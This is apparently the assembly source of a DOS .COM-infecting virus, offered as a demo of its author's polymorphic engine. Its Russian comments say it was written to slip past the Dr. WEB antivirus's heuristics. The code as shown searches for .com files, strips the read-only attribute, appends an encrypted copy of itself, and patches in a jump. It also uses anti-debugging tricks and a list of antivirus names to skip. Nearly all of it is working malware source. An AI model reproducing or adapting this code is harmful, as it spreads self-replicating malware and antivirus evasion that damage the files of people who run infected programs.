;
;       Anti WEB Mutation Engine [AWME] 1.0 demo virus by AD.
;
;   Dr. WEB - сильная штука !
;   Хотя в его эвристическом анализаторе есть дыры :-(
;   Надеюсь, данная програмка поможет (а может и наоборот, только доставит
;       лишние хлопоты) Данилову залатать их.
;
;                               С уважением, Амир aka AD.
;
                masm
                model   tiny
                codeseg
                startupcode

                locals  @@
filestart:
                jmp      start
                nop
                nop
                ret

start:
virstart:
                db      0e8h,0,0                ; Вычислили смещение
                pop     bp
                sub     bp,offset virstart-offset start+3

                mov     di,100h                 ; Восстановили три байта
                lea     si,offset bytes3-offset start[bp]
                mov     cx,3
                cld
        rep     movsb

                call    detect_debug            ; Проверили трассировку
savedta:
                mov     ax,cs                   ; Сохранили DTA
                mov     ds,ax
                add     ah,10h
                mov     es,ax
                mov     cx,100h
                xor     si,si
                xor     di,di
        rep     movsb

                push    es                              ; Сохранили INT 24h
                xor     ax,ax
                mov     es,ax
                push    es
                les     ax,es:[0090h]

                mov     ds:[00b2h],ax
                mov     ds:[00b4h],es

                cli
                mov     bx,cs
                lea     ax,offset int_24h-offset start[bp]
                pop     es
                mov     word ptr es:[0090h],ax
                mov     word ptr es:[0092h],bx
                pop     es
                sti


findfirst:
                mov     ah,4Eh                  ; Нашли первый файл
                lea     dx,offset fmaskCOM-offset start[bp]
                mov     cx,0000000000100111b
                jmp     find
findnext:
                mov     ah,4Fh                  ; Нашли следующий файл
                mov     dx,80h
find:
                int     21h
                jnc     testtime
                jmp     ioerror
testtime:
                call    testname
                jc      findnext
                mov     ax,ds:[0096h]           ; Проверили время
                and     al,1fh
                cmp     al,0ch
                jne     testlen
                jmp     findnext
testlen:
                mov     ax,ds:[009ch]           ; Проверили длину
                or      ax,ax
                jz      nextlen1
                jmp     findnext
nextlen1:
                mov     ax,ds:[009ah]
                cmp     ax,1100                 ; не маловат ?
                jae     nextlen2                ; нет
                jmp     findnext
nextlen2:
                cmp     ax,63000                ; не великоват ?
                jbe     calcnewoff              ; нет
                jmp     findnext
calcnewoff:
                mov     newviroffset-offset start[bp],ax
openfile:
                call    testattr
                jnc     doopen
                jmp     ioerror
doopen:
                mov     dx,009eh                ; Открыли файл
                mov     ax,3D02h
                int     21h
                mov     bx,ax
                jnc     read3bytes
                jmp     ioerror

;--------------- Открыли файл - далее необходимо закрыть ----------------
read3bytes:
                lea     dx,offset bytes3-offset start[bp] ; Сохранили три байта -2
                mov     cx,3
                mov     ah,3fh
                int     21h
                jnc     testexe
                call    closefile
                jmp     ioerror
testexe:
                mov     ax,bytes3-offset start[bp]
                cmp     ah,'Z'          ; на 'ZM' проверять нельзя - WEB поймает
                jne     toendoffile
                call    closefile
                jmp     findnext
toendoffile:
                mov     ax,4202h                ; Установили указатель
                xor     cx,cx                   ; на конец файла
                xor     dx,dx
                int     21h
                jnc     decode&save
                call    closefile
                jmp     ioerror
decode&save:

                inc     word ptr (numofinf-offset start[bp])

                mov     si,bp
                mov     cx,virlen
                call    awme
; Получили в ES:DI указатель на зашифрованное тело
; в CX - длину, в DX - смещение

                sub     dx,3
                add     offset newviroffset-offset start[bp],dx

;
;       Далее идут некоторые ухищрения чтобы обмануть WEB
;
                mov     ax,cx           ; Записываем блоками по 20h байт
                mov     cx,20h
                div     cl
                push    ax

                mov     dx,di
                push    es
                pop     ds

                xor     ah,ah
                mov     di,ax

savevir:
                mov     ax,4000h                ; Записываем тело вируса
                push    ds
                push    es
                pop     ds
                int     21h
                pop     ds
                jnc     nextblock
                call    closefile
                jmp     ioerror
nextblock:
                add     dx,20h
                dec     di
                jnz     savevir
                pop     ax
                cmp     ah,0
                je      tobegin
                mov     cl,ah
                xor     ch,ch
                mov     ah,40h
                push    ds
                push    es
                pop     ds
                int     21h
                pop     ds
                jnc     tobegin
                call    closefile
                jmp     ioerror
tobegin:
                push    cs
                pop     ds
                mov     ax,4200h                ; Указатель на начало файла
                xor     cx,cx
                xor     dx,dx
                int     21h

                mov     ah,40h                  ; Записали три первых байта
                lea     dx,offset newbytes3-offset start[bp]
                mov     cx,3
                int     21h

                mov     ax,ds:[0096h]           ; Установили 24 секунды
                and     al,0e0h
                or      al,00ch
                mov     ds:[0096h],ax

                call    closefile

ioerror:
exit:
                push    es
                xor     ax,ax
                mov     es,ax
                cli
                mov     ax,ds:[00b2h]
                mov     word ptr es:[0090h],ax
                mov     ax,ds:[00b4h]
                mov     word ptr es:[0092h],ax
                sti

                pop     ds
                push    cs
                pop     es
                xor     si,si
                xor     di,di
                mov     cx,100h
        rep     movsb
debug:
                xor     bx,bx
                xor     cx,cx
                xor     dx,dx
                xor     di,di
                xor     si,si
                push    cs
                push    cs
                pop     ds
                pop     es
                mov     ax,100h
                push    ax
                xor     ax,ax
                ret

;----------- Проверить атрибут read only и, если нужно, снять ---------
testattr        proc    near
                test    byte ptr ds:[0095h],00000001d   ; read only ?
                jz      attrok                          ; нет
                mov     dx,009eh                ; снимаем атрибуты
                mov     ax,4301h
                xor     cx,cx
                int     21h
attrok:
                ret
testattr        endp

;----------- Закрыть файл и установить атрибуты -----------------------
closefile       proc    near
                push    cs
                pop     ds
                mov     ax,5701h                ; Установить время и дату
                mov     cx,ds:[0096h]
                mov     dx,ds:[0098h]
                int     21h

                mov     ah,3eh                  ; Закрыть файл
                int     21h
                jc      return

                mov     ax,4301h                ; Установить атрибуты
                mov     cl,ds:[0095h]
                mov     ch,0
                mov     dx,009eh
                int     21h
return:
                ret
closefile       endp

;------------ Процедура обнаружения трассировки ----------------------
detect_debug    proc    near
;
;       С маленькой доработкой взята из NATASа
;
                xor     ax,ax
                pushf
                pop     dx
                and     dh,0FEh
                push    dx
                push    dx
                popf
                push    ss
                pop     ss
                pushf
                pop     dx
                test    dh,01
                pop     dx
                je      no_debug
                xor     bp,bp
                mov     cx,ss
                cli
                mov     ss,bp
                les     di,[bp+4]
                mov     ss,cx
                sti
                mov     al,0CFh
                cld
                stosb
                push    dx
                popf
                pop     bx
                jmp     debug
no_debug:
                pop     bx
                cmp     byte ptr [bx],0cch
                jne     nobreak
                jmp     debug
nobreak:
                push    bx
                ret

detect_debug    endp
;-------------------------------------------------------------------

;----------- Обработчик критической ошибки -------------------------
int_24h         proc    far
                xor     ax,ax
                iret
int_24h         endp

;----------- Проверка на некоторые файлы ---------------------------
testname        proc    near
                mov     ax,ds:[09eh]
                lea     bx,offset noinfdata-offset start[bp+2]
@@2:
                inc     bx
                inc     bx
                cmp     byte ptr [bx],0
                je      @@1
                cmp     ax,[bx]
                jne     @@2
                stc
                ret

@@1:            clc
                ret

testname        endp

include         awme.asm                ; Сам алгоритм полиморфности

;-------------------------------------------------------------------
bytes3          db      90h,90h,90h
newbytes3       db      0e9h
newviroffset    dw      0
numofinf        dw      0
noinfdata       db      'AI','WE','SC','CO','VS','AD','AN','-V',0
fmaskCOM        db      '*.com*',0
message         db      'This is a simple [AWME] demo virus by AD.'
vers            db      01h

virlen          equ     $-start

                end
